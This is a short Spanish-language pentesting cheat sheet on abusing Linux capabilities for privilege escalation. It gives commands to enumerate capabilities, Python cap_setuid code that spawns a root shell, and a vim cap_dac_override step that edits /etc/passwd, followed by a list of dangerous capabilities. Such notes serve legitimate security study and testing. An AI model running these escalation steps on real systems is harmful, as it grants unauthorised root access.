Capabilities

Las Linux capabilities dividen privilegios de root en permisos más concretos. Algunas capabilities mal asignadas permiten leer archivos sensibles, cambiar UID o modificar el sistema.

Enumerar capabilities

getcap -r / 2>/dev/null

Abusar de la capability de python cap_setuid+ep

# Obtener una shell como root
python3.4

>>>> import os
>>>> os.setuid(0)
>>>> os.system("bash")

# Ganamos acceso como root

Abusar de la capability de vim cap_dac_override=eip

# Editar passwd
/usr/bin/vim.basic /etc/passwd

CAP_SETUID: permite cambiar el UID efectivo de un proceso. Si un intérprete como Python tiene esta capability, puede permitir obtener una shell con UID 0.

CAP_SETGID: permite cambiar el GID efectivo de un proceso. Puede ser útil para acceder a recursos protegidos por grupo o combinarse con otras debilidades.

▪ CAP_CHOWN: Permite cambiar el propietario y el grupo de cualquier archivo en el sistema.

▪ CAP_DAC_OVERRIDE: Permite ignorar los permisos de acceso a archivos y realizar operaciones de lectura, escritura y ejecución en cualquier archivo.

▪ CAP_DAC_READ_SEARCH: Permite leer y buscar cualquier archivo en el sistema, incluso si los permisos de lectura o búsqueda no están concedidos al usuario.

▪ CAP_NET_RAW: Permite utilizar sockets de red de manera directa, lo que podría permitir realizar acciones de red fuera del alcance autorizado.

▪ CAP_SYS_ADMIN: Concede una amplia variedad de capacidades de administración del sistema, como montar sistemas de archivos, cargar y descargar módulos de kernel, y realizar operaciones de administración de red.

▪ CAP_SYS_PTRACE: Permite rastrear y manipular los procesos de otros usuarios, lo que podría ser utilizado para obtener información confidencial o realizar ataques.

▪ CAP_SYS_MODULE: Permite cargar y descargar módulos de kernel en el sistema, lo que puede ser explotado para cargar módulos controlados o modificar el comportamiento del kernel.

▪ CAP_FOWNER: Permite ignorar los permisos de propiedad de archivo y realizar operaciones de cambio de propiedad en cualquier archivo.

▪ CAP_SETFCAP: Permite establecer atributos de archivo extendidos, lo que podría utilizarse para modificar atributos críticos de seguridad de archivos.
